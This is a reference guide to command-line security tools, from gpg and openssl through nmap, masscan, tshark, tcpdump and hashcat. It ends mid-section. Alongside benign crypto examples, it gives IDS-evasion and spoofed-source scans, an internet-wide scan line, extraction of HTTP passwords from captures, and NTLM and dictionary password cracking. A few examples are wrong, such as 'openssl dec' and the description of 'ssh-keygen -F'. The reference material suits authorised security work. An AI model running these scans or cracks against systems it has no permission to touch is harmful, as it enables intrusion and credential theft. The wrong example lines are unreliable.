## Security Tools

### **gpg** - GNU Privacy Guard**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [gpg, gnu privacy guard]
synonyms: [gpg]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: Complete implementation of OpenPGP standard for encryption and digital signatures
**Location**: `/opt/homebrew/bin/gpg`
**Common Use Cases**:

- File encryption and decryption
- Digital signatures
- Key management
- Secure communication

**See Also**: Related tools in this category

**Examples**:

```bash
# Generate new key pair
gpg --generate-key

# List keys
gpg --list-keys
gpg --list-secret-keys

# Encrypt file
gpg --encrypt --recipient user@example.com file.txt

# Decrypt file
gpg --decrypt file.txt.gpg

# Sign file
gpg --sign file.txt

# Verify signature
gpg --verify file.txt.gpg

# Export public key
gpg --export --armor user@example.com > publickey.asc

# Import key
gpg --import publickey.asc

# Encrypt and sign
gpg --encrypt --sign --recipient user@example.com file.txt

# Symmetric encryption
gpg --symmetric file.txt
```


### **openssl** - SSL/TLS Toolkit**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [openssl, ssl/tls toolkit]
synonyms: [openssl]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: Cryptography toolkit implementing SSL/TLS protocols
**Location**: `/usr/bin/openssl`
**Common Use Cases**:

- Certificate generation and management
- Encryption and decryption
- Hash generation
- SSL/TLS testing

**See Also**: Related tools in this category

**Examples**:

```bash
# Generate RSA private key
openssl genrsa -out private.key 2048

# Generate public key from private
openssl rsa -in private.key -pubout -out public.key

# Create certificate signing request
openssl req -new -key private.key -out cert.csr

# Generate self-signed certificate
openssl req -x509 -new -key private.key -days 365 -out cert.crt

# View certificate details
openssl x509 -in cert.crt -text -noout

# Test SSL connection
openssl s_client -connect hostname:443

# Generate password hash
openssl passwd -6 mypassword

# Encrypt file
openssl enc -aes256 -in file.txt -out file.enc

# Decrypt file
openssl dec -aes256 -in file.enc -out file.txt

# Generate random data
openssl rand -base64 32

# Calculate file hash
openssl dgst -sha256 file.txt

# Convert certificate formats
openssl x509 -in cert.crt -outform DER -out cert.der
```


### **ssh-keygen** - SSH Key Generation**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [ssh-keygen, ssh key generation]
synonyms: [ssh-keygen]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: Generate, manage, and convert SSH authentication keys
**Location**: `/usr/bin/ssh-keygen`
**Common Use Cases**:

- SSH key pair generation
- Key conversion and management
- Host key management
- Authentication setup

**See Also**: Related tools in this category

**Examples**:

```bash
# Generate new SSH key pair
ssh-keygen -t rsa -b 4096 -C "user@example.com"

# Generate Ed25519 key (recommended)
ssh-keygen -t ed25519 -C "user@example.com"

# Generate key with specific filename
ssh-keygen -t rsa -f ~/.ssh/specific_key

# Change key passphrase
ssh-keygen -p -f ~/.ssh/id_rsa

# Show key fingerprint
ssh-keygen -lf ~/.ssh/id_rsa.pub

# Convert private key format
ssh-keygen -p -m PEM -f ~/.ssh/id_rsa

# Generate host keys
ssh-keygen -A

# Remove host from known_hosts
ssh-keygen -R hostname

# Test key against server
ssh-keygen -F hostname

# Export public key in different format
ssh-keygen -e -f ~/.ssh/id_rsa.pub
```


### **md5sum/shasum** - Checksum Utilities**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [md5sum/shasum, checksum utilities]
synonyms: [md5sum/shasum]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: Calculate and verify MD5/SHA checksums
**Location**: `/usr/bin/md5`, `/usr/bin/shasum`
**Common Use Cases**:

- File integrity verification
- Data corruption detection
- Security auditing
- Change detection

**See Also**: Related tools in this category

**Examples**:

```bash
# Calculate MD5 checksum (macOS)
md5 file.txt

# Calculate SHA checksums
shasum -a 1 file.txt    # SHA-1
shasum -a 256 file.txt  # SHA-256
shasum -a 512 file.txt  # SHA-512

# Create checksum file
shasum -a 256 *.txt > checksums.sha256

# Verify checksums
shasum -a 256 -c checksums.sha256

# Compare two files
shasum file1.txt file2.txt

# Calculate for multiple files
find . -type f -exec shasum -a 256 {} \;

# Quick integrity check
original_hash=$(shasum -a 256 file.txt)
# ... file transfer ...
new_hash=$(shasum -a 256 file.txt)
[ "$original_hash" = "$new_hash" ] && echo "File intact"
```

### **base64** - Base64 Encoding/Decoding**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [base64, base64 encoding/decoding]
synonyms: [base64]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: Encode and decode data using Base64
**Location**: `/usr/bin/base64`
**Common Use Cases**:

- Data encoding for transmission
- Configuration file encoding
- Email attachment encoding
- Binary data handling

**See Also**: Related tools in this category

**Examples**:

```bash
# Encode file
base64 file.txt > encoded.txt

# Encode string
echo "Hello World" | base64

# Decode file
base64 -d encoded.txt > decoded.txt

# Decode string
echo "SGVsbG8gV29ybGQ=" | base64 -d

# Encode without line wrapping
base64 -w 0 file.txt

# Encode binary file
base64 image.jpg > image.b64

# URL-safe encoding (if supported)
echo "data" | base64 | tr '+/' '-_' | tr -d '='

# Practical usage in scripts
API_KEY=$(echo -n "user:password" | base64)
curl -H "Authorization: Basic $API_KEY" api.example.com
```


### **security** - macOS Keychain Tool**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [security, macos keychain tool]
synonyms: [security]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: macOS keychain and security framework command-line interface
**Location**: `/usr/bin/security`
**Common Use Cases**:

- Keychain management
- Certificate handling
- Password management
- Security policy configuration

**See Also**: Related tools in this category

**Examples**:

```bash
# List keychains
security list-keychains

# Create new keychain
security create-keychain test.keychain

# Add keychain to search list
security list-keychains -s login.keychain test.keychain

# Add password to keychain
security add-generic-password -a account -s service -w password

# Retrieve password
security find-generic-password -a account -s service -w

# Add internet password
security add-internet-password -a user -s server.com -w password

# Export certificate
security export -k keychain -t certs -f pemseq -o certs.pem

# Import certificate
security import cert.p12 -k keychain

# Show keychain info
security show-keychain-info keychain

# Lock/unlock keychain
security lock-keychain keychain
security unlock-keychain keychain
```


### **codesign** - Code Signing (macOS)**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [codesign, code signing (macos)]
synonyms: [codesign]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: Create and verify code signatures for macOS applications
**Location**: `/usr/bin/codesign`
**Common Use Cases**:

- Application signing
- Security verification
- Distribution preparation
- Malware detection

**See Also**: Related tools in this category

**Examples**:

```bash
# Sign application
codesign -s "Developer ID" app.app

# Verify signature
codesign -v app.app

# Deep verification
codesign -v -v app.app

# Display signing information
codesign -d -vv app.app

# Sign with entitlements
codesign -s "Developer ID" --entitlements entitlements.plist app.app

# Remove signature
codesign --remove-signature app.app

# Check if binary is signed
codesign -dv app.app 2>&1 | grep "Authority"

# Sign with timestamp
codesign -s "Developer ID" --timestamp app.app
```


### **spctl** - System Policy Control (macOS)**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [spctl, system policy control (macos)]
synonyms: [spctl]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: Manage system security policies and Gatekeeper
**Location**: `/usr/sbin/spctl`
**Common Use Cases**:

- Gatekeeper management
- Application security assessment
- Policy configuration
- Security troubleshooting

**See Also**: Related tools in this category

**Examples**:

```bash
# Check Gatekeeper status
spctl --status

# Assess application
spctl --assess app.app

# Assess with verbose output
spctl --assess -vv app.app

# Enable/disable Gatekeeper
sudo spctl --master-enable
sudo spctl --master-disable

# Add application to whitelist
sudo spctl --add app.app

# Remove from whitelist
sudo spctl --remove app.app

# List rules
spctl --list

# Assess installer package
spctl --assess --type install package.pkg
```


### **dscl** - Directory Service Command Line (macOS)**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [dscl, directory service command line]
synonyms: [dscl]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: Directory Service command-line utility for user/group management
**Location**: `/usr/bin/dscl`
**Common Use Cases**:

- User account management
- Group administration
- Directory service queries
- System administration

**See Also**: Related tools in this category

**Examples**:

```bash
# List all users
dscl . -list /Users

# Show user information
dscl . -read /Users/username

# Create new user
sudo dscl . -create /Users/newuser
sudo dscl . -create /Users/newuser UserShell /bin/bash
sudo dscl . -create /Users/newuser RealName "New User"

# Set user password
sudo dscl . -passwd /Users/username newpassword

# Delete user
sudo dscl . -delete /Users/username

# List groups
dscl . -list /Groups

# Add user to group
sudo dscl . -append /Groups/admin GroupMembership username

# Check group membership
dscl . -read /Groups/admin GroupMembership

# Change user's home directory
sudo dscl . -change /Users/username NFSHomeDirectory /old/path /new/path
```


### **keytool** - Java Key and Certificate Management**Difficulty**: ⭐⭐⭐ Intermediate

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐ Intermediate
aliases: []
tags: [#cli, #file-directory-operations]
related: []
keywords: [keytool, java key and certificate manag]
synonyms: [keytool]
platform: [macOS, Linux]
installation: Built-in
-->
**Description**: Tool for managing private keys and X.509 certificate chains for Java applications
**Location**: `/usr/bin/keytool`
**Common Use Cases**:

- Java keystore management
- SSL certificate handling
- Cryptographic key generation
- Certificate signing and verification

**See Also**: Related tools in this category

**Examples**:

```bash
# Generate new key pair in keystore
keytool -genkey -alias mykey -keyalg RSA -keystore mystore.jks

# List entries in keystore
keytool -list -keystore mystore.jks

# Export certificate
keytool -export -alias mykey -file mycert.cer -keystore mystore.jks

# Import certificate into keystore
keytool -import -alias trustcert -file cert.cer -keystore truststore.jks

# View certificate details
keytool -printcert -file mycert.cer

# Delete entry from keystore
keytool -delete -alias mykey -keystore mystore.jks

# Change keystore password
keytool -storepasswd -keystore mystore.jks

# Change key password
keytool -keypasswd -alias mykey -keystore mystore.jks

# Generate certificate signing request (CSR)
keytool -certreq -alias mykey -file request.csr -keystore mystore.jks

# Import signed certificate
keytool -import -alias mykey -file signed.cer -keystore mystore.jks

# Verify certificate chain
keytool -list -v -keystore mystore.jks -alias mykey
```

---


## Network Security & Scanning

### **nmap** - Network Scanner**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #network, #scanning, #penetration-testing, #port-scanner]
related: [masscan, netstat, ss, tcpdump, wireshark]
keywords: [nmap, network scanner, port scanner, security scanning, vulnerability detection, network discovery]
synonyms: [network-mapper, port-scanner, security-scanner]
platform: [macOS, Linux, Windows]
installation: brew install nmap
-->
**Description**: Network exploration tool and security/port scanner - industry standard for network discovery
**Location**: `/opt/homebrew/bin/nmap`
**Common Use Cases**:

- Network discovery and mapping
- Port scanning and service detection
- OS detection and fingerprinting
- Vulnerability scanning
- Security auditing
- Network inventory

**Why Essential**: Industry-standard tool for network security assessments, penetration testing, and network administration.

**See Also**: `masscan` (ultra-fast alternative), `netstat` (local connections), `tcpdump` (packet capture)

**Examples**:

```bash
# Basic scans
nmap scanme.nmap.org                 # Simple scan
nmap 192.168.1.1                     # Scan single host
nmap 192.168.1.0/24                  # Scan network range
nmap 192.168.1.1-20                  # Scan IP range

# Port scanning
nmap -p 80 192.168.1.1               # Scan specific port
nmap -p 80,443,8080 192.168.1.1      # Scan multiple ports
nmap -p- 192.168.1.1                 # Scan all 65535 ports
nmap -p 1-1000 192.168.1.1           # Scan port range
nmap --top-ports 100 192.168.1.1     # Scan top 100 ports

# Scan types
nmap -sS 192.168.1.1                 # SYN scan (stealth)
nmap -sT 192.168.1.1                 # TCP connect scan
nmap -sU 192.168.1.1                 # UDP scan
nmap -sA 192.168.1.1                 # ACK scan
nmap -sN 192.168.1.1                 # NULL scan
nmap -sF 192.168.1.1                 # FIN scan

# Service and OS detection
nmap -sV 192.168.1.1                 # Service version detection
nmap -O 192.168.1.1                  # OS detection
nmap -A 192.168.1.1                  # Aggressive scan (OS, version, scripts, traceroute)

# Timing and performance
nmap -T0 192.168.1.1                 # Paranoid (very slow, IDS evasion)
nmap -T1 192.168.1.1                 # Sneaky
nmap -T2 192.168.1.1                 # Polite
nmap -T3 192.168.1.1                 # Normal (default)
nmap -T4 192.168.1.1                 # Aggressive (fast)
nmap -T5 192.168.1.1                 # Insane (very fast)

# NSE (Nmap Scripting Engine)
nmap --script vuln 192.168.1.1       # Run vulnerability scripts
nmap --script default 192.168.1.1    # Run default scripts
nmap --script http-title 192.168.1.1 # Get HTTP title
nmap --script ssl-enum-ciphers -p 443 192.168.1.1  # Check SSL/TLS ciphers
nmap --script smb-vuln* 192.168.1.1  # SMB vulnerability checks

# Output formats
nmap -oN scan.txt 192.168.1.1        # Normal output
nmap -oX scan.xml 192.168.1.1        # XML output
nmap -oG scan.gnmap 192.168.1.1      # Grepable output
nmap -oA scan 192.168.1.1            # All formats

# Host discovery
nmap -sn 192.168.1.0/24              # Ping scan (no port scan)
nmap -Pn 192.168.1.1                 # Skip ping (assume host is up)
nmap -PS80,443 192.168.1.1           # TCP SYN ping
nmap -PA80,443 192.168.1.1           # TCP ACK ping
nmap -PU 192.168.1.1                 # UDP ping

# Advanced scans
nmap -sC -sV -p- 192.168.1.1         # Full scan with scripts
nmap -A -T4 192.168.1.0/24           # Aggressive network scan
nmap -F 192.168.1.1                  # Fast scan (100 common ports)
nmap -r -p 1-100 192.168.1.1         # Sequential port scan
nmap --reason 192.168.1.1            # Show why ports are open/closed

# Firewall/IDS evasion
nmap -f 192.168.1.1                  # Fragment packets
nmap -D RND:10 192.168.1.1           # Decoy scan (10 random IPs)
nmap -S 192.168.1.5 192.168.1.1      # Spoof source IP
nmap --data-length 50 192.168.1.1    # Append random data

# Practical examples
# Quick host discovery
nmap -sn 192.168.1.0/24 -oG - | grep "Up" | awk '{print $2}'

# Find web servers
nmap -p 80,443 --open 192.168.1.0/24

# Scan for specific service
nmap -p 22 --open 192.168.1.0/24     # Find SSH servers

# Comprehensive scan
nmap -sS -sV -O -A -T4 -p- --script vuln -oA full-scan 192.168.1.1
```

---


### **masscan** - Ultra-Fast Port Scanner**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #network, #scanning, #fast-scanner, #port-scanner]
related: [nmap, zmap]
keywords: [masscan, fast port scanner, mass scanner, network scanning, internet scanner]
synonyms: [mass-scanner, fast-scanner]
platform: [macOS, Linux]
installation: brew install masscan
-->
**Description**: TCP port scanner that can scan the entire Internet in under 6 minutes - fastest port scanner
**Location**: `/opt/homebrew/bin/masscan`
**Common Use Cases**:

- Large-scale network scanning
- Internet-wide surveys
- Fast port discovery
- Security assessments
- Network research

**Why Essential**: When you need to scan thousands or millions of IPs quickly - can transmit 10 million packets per second.

**See Also**: `nmap` (comprehensive scanning), `zmap` (similar fast scanner)

**Examples**:

```bash
# Basic scans
masscan 192.168.1.0/24 -p80,443      # Scan ports 80,443
masscan 192.168.1.0/24 -p0-1000      # Scan port range
masscan 192.168.1.0/24 -p- # Scan all ports (0-65535)

# Scan entire internet for port 80 (educational purposes only!)
# masscan 0.0.0.0/0 -p80 --rate 10000000  # DO NOT RUN WITHOUT AUTHORIZATION

# Rate limiting
masscan 192.168.1.0/24 -p80 --rate 1000          # 1000 packets/sec
masscan 192.168.1.0/24 -p80 --rate 100000        # 100k packets/sec
masscan 192.168.1.0/24 -p80 --max-rate 10000     # Max 10k packets/sec

# Output formats
masscan 192.168.1.0/24 -p80 -oL scan.txt         # List format
masscan 192.168.1.0/24 -p80 -oX scan.xml         # XML format
masscan 192.168.1.0/24 -p80 -oG scan.gnmap       # Grepable format
masscan 192.168.1.0/24 -p80 -oJ scan.json        # JSON format

# Banner grabbing
masscan 192.168.1.0/24 -p80,443 --banners        # Grab service banners

# Exclude targets
masscan 192.168.1.0/24 -p80 --exclude 192.168.1.1
masscan 10.0.0.0/8 -p80 --excludefile exclude.txt

# Interface and routing
masscan 192.168.1.0/24 -p80 -e eth0              # Specify interface
masscan 192.168.1.0/24 -p80 --router-mac 11:22:33:44:55:66

# Configuration file
masscan -c scan.conf                              # Use config file

# Example config file content:
cat > masscan.conf << 'EOF'
rate = 10000
output-format = json
output-filename = scan.json
ports = 80,443,8080,8443
range = 192.168.1.0/24
EOF
masscan -c masscan.conf

# Resume scanning
masscan 192.168.1.0/24 -p- --resume scan.state  # Resume from paused scan

# Practical examples
# Find web servers in subnet
masscan 192.168.0.0/16 -p80,443,8080,8443 --rate 10000

# Scan multiple port ranges
masscan 192.168.1.0/24 -p20-25,80,443,3306,5432,8080-8090

# Fast discovery scan
masscan 10.0.0.0/8 -p80 --rate 100000 -oL webservers.txt

# Banner grab for specific service
masscan 192.168.1.0/24 -p3306 --banners --rate 1000 | grep -i mysql
```

---


### **wireshark/tshark** - Network Protocol Analyzer**Difficulty**: ⭐⭐⭐⭐⭐ Expert

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐⭐ Expert
aliases: [tshark]
tags: [#security, #network, #packet-analysis, #protocol-analyzer, #debugging]
related: [tcpdump, nmap, netstat]
keywords: [wireshark, tshark, packet analyzer, network analysis, packet capture, protocol analyzer, pcap]
synonyms: [packet-analyzer, network-analyzer, packet-sniffer]
platform: [macOS, Linux, Windows]
installation: brew install wireshark
-->
**Description**: World's most popular network protocol analyzer - deep inspection of network traffic
**Location**: `/opt/homebrew/bin/tshark` (CLI), `/Applications/Wireshark.app` (GUI)
**Common Use Cases**:

- Network troubleshooting
- Security analysis
- Protocol development
- Network forensics
- Malware analysis
- Performance analysis

**Why Essential**: Industry-standard tool for packet analysis, supports hundreds of protocols, essential for network security.

**See Also**: `tcpdump` (simpler alternative), `nmap` (scanning), `ss` (socket statistics)

**Examples**:

```bash
# List interfaces
tshark -D                            # List capture interfaces

# Basic capture
tshark -i en0                        # Capture on interface en0
tshark -i en0 -c 100                 # Capture 100 packets
tshark -i en0 -a duration:60         # Capture for 60 seconds
tshark -i en0 -w capture.pcap        # Write to file

# Display filters
tshark -i en0 -f "tcp port 80"       # Capture filter (BPF syntax)
tshark -r capture.pcap -Y "http"     # Display filter (Wireshark syntax)
tshark -r capture.pcap -Y "tcp.port == 443"
tshark -r capture.pcap -Y "ip.addr == 192.168.1.1"

# Protocol-specific filters
tshark -r capture.pcap -Y "http.request"
tshark -r capture.pcap -Y "dns.qry.name contains google"
tshark -r capture.pcap -Y "ssl.handshake"
tshark -r capture.pcap -Y "tcp.flags.syn == 1"

# Output formats
tshark -r capture.pcap -T json       # JSON output
tshark -r capture.pcap -T jsonraw    # JSON with raw data
tshark -r capture.pcap -T fields -e frame.number -e ip.src -e ip.dst
tshark -r capture.pcap -T pdml       # PDML (XML) output

# Statistics
tshark -r capture.pcap -q -z io,stat,1               # I/O statistics
tshark -r capture.pcap -q -z conv,tcp                # TCP conversations
tshark -r capture.pcap -q -z endpoints,ip            # IP endpoints
tshark -r capture.pcap -q -z http,tree               # HTTP request tree
tshark -r capture.pcap -q -z dns,tree                # DNS tree

# Extract data
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "http" --export-objects http,./extracted

# Follow streams
tshark -r capture.pcap -q -z follow,tcp,ascii,0      # Follow TCP stream 0
tshark -r capture.pcap -q -z follow,http,ascii,0     # Follow HTTP stream

# Practical examples
# Capture HTTP traffic
tshark -i en0 -f "tcp port 80" -w http.pcap

# Analyze DNS queries
tshark -r capture.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name

# Find suspicious traffic
tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" -T fields -e ip.src -e tcp.dstport | sort | uniq -c | sort -rn

# Extract HTTP passwords (use responsibly!)
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# Monitor live DNS
tshark -i en0 -f "udp port 53" -Y "dns.qry.type == 1" -T fields -e dns.qry.name

# Detect port scans
tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" -T fields -e ip.src | sort | uniq -c | sort -rn | head -20

# Bandwidth by IP
tshark -r capture.pcap -q -z ip_hosts,tree

# SSL/TLS analysis
tshark -r capture.pcap -Y "ssl.handshake.type == 1" -T fields -e ip.src -e ssl.handshake.extensions_server_name

# Advanced filtering
tshark -r capture.pcap -Y "http.request.method == GET and http.response.code == 200"
tshark -r capture.pcap -Y "tcp.analysis.retransmission"
```

---


### **tcpdump** - Packet Analyzer**Difficulty**: ⭐⭐⭐⭐ Advanced

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐ Advanced
aliases: []
tags: [#security, #network, #packet-capture, #debugging, #monitoring]
related: [wireshark, tshark, nmap, netstat]
keywords: [tcpdump, packet capture, network sniffing, packet analysis, pcap, network debugging]
synonyms: [packet-dump, network-sniffer]
platform: [macOS, Linux]
installation: Built-in (macOS), apt install tcpdump (Linux)
-->
**Description**: Powerful command-line packet analyzer - capture and analyze network traffic
**Location**: `/usr/sbin/tcpdump`
**Common Use Cases**:

- Network debugging
- Security monitoring
- Traffic analysis
- Protocol troubleshooting
- Performance analysis
- Forensics

**Why Essential**: Lightweight, fast packet capture tool available on most Unix systems. Essential for quick network analysis.

**See Also**: `wireshark` (GUI alternative), `tshark` (Wireshark CLI), `ss` (socket stats)

**Examples**:

```bash
# Basic capture
sudo tcpdump                         # Capture on default interface
sudo tcpdump -i en0                  # Capture on specific interface
sudo tcpdump -c 100                  # Capture 100 packets
sudo tcpdump -n                      # Don't resolve hostnames

# Write to file
sudo tcpdump -w capture.pcap         # Write to pcap file
sudo tcpdump -r capture.pcap         # Read from pcap file
sudo tcpdump -w capture.pcap -C 100  # Rotate file every 100MB
sudo tcpdump -w capture.pcap -G 3600 # Rotate file every hour

# Filters (BPF syntax)
sudo tcpdump host 192.168.1.1        # Traffic to/from host
sudo tcpdump src 192.168.1.1         # Traffic from host
sudo tcpdump dst 192.168.1.1         # Traffic to host
sudo tcpdump net 192.168.1.0/24      # Traffic to/from network

# Port filters
sudo tcpdump port 80                 # Port 80 traffic
sudo tcpdump src port 80             # Source port 80
sudo tcpdump dst port 80             # Destination port 80
sudo tcpdump portrange 8000-9000     # Port range

# Protocol filters
sudo tcpdump tcp                     # TCP traffic only
sudo tcpdump udp                     # UDP traffic only
sudo tcpdump icmp                    # ICMP traffic only
sudo tcpdump arp                     # ARP traffic only

# Combinations
sudo tcpdump 'tcp and port 80'       # TCP port 80
sudo tcpdump 'host 192.168.1.1 and port 22'  # SSH to specific host
sudo tcpdump 'tcp and (port 80 or port 443)' # HTTP/HTTPS

# Advanced filters
sudo tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'  # SYN packets
sudo tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn'  # SYN only (no ACK)
sudo tcpdump 'tcp[tcpflags] & (tcp-rst) != 0'  # RST packets

# Output formatting
sudo tcpdump -v                      # Verbose output
sudo tcpdump -vv                     # More verbose
sudo tcpdump -vvv                    # Maximum verbosity
sudo tcpdump -X                      # Hex and ASCII dump
sudo tcpdump -XX                     # Hex dump with link-level header
sudo tcpdump -A                      # ASCII dump
sudo tcpdump -l                      # Line-buffered output (for piping)

# Packet length
sudo tcpdump -s 0                    # Capture full packets (default in newer versions)
sudo tcpdump -s 96                   # Capture first 96 bytes

# Practical examples
# Capture HTTP traffic
sudo tcpdump -i en0 -A 'tcp port 80'

# Monitor DNS queries
sudo tcpdump -i en0 -n 'udp port 53'

# Detect SYN flood
sudo tcpdump -i en0 'tcp[tcpflags] & tcp-syn != 0' -c 1000 | wc -l

# Capture HTTPS handshakes
sudo tcpdump -i en0 'tcp port 443 and (tcp[tcpflags] & tcp-syn != 0)'

# Monitor specific subnet
sudo tcpdump -i en0 'net 10.0.0.0/24'

# Exclude SSH (avoid feedback loop)
sudo tcpdump -i en0 'not port 22'

# Capture and display HTTP requests
sudo tcpdump -i en0 -s 0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# Monitor ARP requests
sudo tcpdump -i en0 -e -n arp

# Detect port scans
sudo tcpdump -i en0 'tcp[tcpflags] & (tcp-syn|tcp-fin) == (tcp-syn|tcp-fin)'

# Save traffic for later analysis with Wireshark
sudo tcpdump -i en0 -w traffic.pcap -s 0
# Then open traffic.pcap in Wireshark

# Real-time monitoring with timestamps
sudo tcpdump -i en0 -tttt -n

# Capture only specific HTTP methods
sudo tcpdump -i en0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420)'  # GET requests
```

---


## Password & Hash Analysis

### **hashcat** - Advanced Password Recovery**Difficulty**: ⭐⭐⭐⭐⭐ Expert

<!-- metadata:
category: Security Tools
difficulty: ⭐⭐⭐⭐⭐ Expert
aliases: []
tags: [#security, #password-cracking, #hash-cracking, #gpu, #penetration-testing]
related: [john, hydra, openssl]
keywords: [hashcat, password cracking, hash cracking, gpu cracking, password recovery, hash analysis]
synonyms: [password-cracker, hash-cracker, gpu-cracker]
platform: [macOS, Linux, Windows]
installation: brew install hashcat
-->
**Description**: World's fastest password cracker with GPU acceleration - supports 300+ hash algorithms
**Location**: `/opt/homebrew/bin/hashcat`
**Common Use Cases**:

- Password recovery
- Security auditing
- Hash cracking
- Penetration testing
- Forensics
- Password policy testing

**Why Essential**: Industry-standard GPU-accelerated password recovery tool. Can crack billions of passwords per second.

**See Also**: `john` (CPU-based alternative), `hydra` (network attacks), `openssl` (hash generation)

**Examples**:

```bash
# Hash modes (common examples)
# Mode 0 = MD5
# Mode 100 = SHA1
# Mode 1000 = NTLM
# Mode 1400 = SHA256
# Mode 1700 = SHA512
# Mode 1800 = sha512crypt (Linux)
# Mode 3200 = bcrypt
# Mode 22000 = WPA-PBKDF2-PMKID+EAPOL

# Basic attacks
hashcat -m 0 -a 0 hashes.txt wordlist.txt              # Dictionary attack on MD5
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt              # NTLM with rockyou wordlist
hashcat -m 1400 -a 0 sha256.txt passwords.txt          # SHA256 dictionary attack

# Attack modes
hashcat -m 0 -a 0 hash.txt wordlist.txt                # -a 0: Straight/Dictionary
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt # -a 1: Combinator
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a                # -a 3: Brute-force/Mask
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d         # -a 6: Hybrid (wordlist + mask)
hashcat -m 0 -a 7 hash.txt ?d?d?d wordlist.txt         # -a 7: Hybrid (mask + wordlist)

# Mask attack charsets
# ?l = lowercase (abcdefghijklmnopqrstuvwxyz)
# ?u = uppercase (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
# ?d = digits (0123456789)
# ?h = hex lowercase (0123456789abcdef)
# ?H = hex uppercase (0123456789ABCDEF)
# ?s = special characters (!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~)
# ?a = all (?l?u?d?s)
# ?b = binary (0x00-0xFF)

# Mask examples
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d                # 6 digits
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?d?d              # Ullldd (e.g., Pass12)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a            # 8 any characters
hashcat -m 0 -a 3 hash.txt password?d?d                # password + 2 digits

# Rules
hashcat -m 0 -a 0 hash.txt wordlist.txt -r best64.rule # Apply best64 rule
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/rockyou-30000.rule
hashcat -m 0 -a 0 hash.txt wordlist.txt -g 100000      # Generate 100k rules

# Session management
hashcat -m 0 -a 0 hash.txt wordlist.txt --session mysession
hashcat --session mysession --restore                   # Restore session
hashcat --session mysession --remove                    # Remove session

# Performance
hashcat -m 0 -a 0 hash.txt wordlist.txt -w 3           # Workload profile (1-4)
hashcat -m 0 -a 0 hash.txt wordlist.txt -O             # Optimized kernels
hashcat -m 0 -a 0 hash.txt wordlist.txt -d 1,2         # Use specific GPU devices
hashcat -b                                              # Benchmark all algorithms
hashcat -b -m 1000                                      # Benchmark NTLM

# Output
hashcat -m 0 -a 0 hash.txt wordlist.txt --show         # Show cracked passwords
hashcat -m 0 -a 0 hash.txt wordlist.txt --left         # Show uncracked hashes
hashcat -m 0 -a 0 hash.txt wordlist.txt -o cracked.txt # Output to file
hashcat -m 0 -a 0 hash.txt wordlist.txt --outfile-format 2  # Custom output format

# Hash examples
# Create test hashes
echo -n "password" | md5sum                            # MD5
echo -n "password" | openssl dgst -sha1                # SHA1
echo -n "password" | openssl dgst -sha256              # SHA256

# Practical examples
# Crack MD5 hashes
hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt

# Crack Linux shadow file (SHA512)
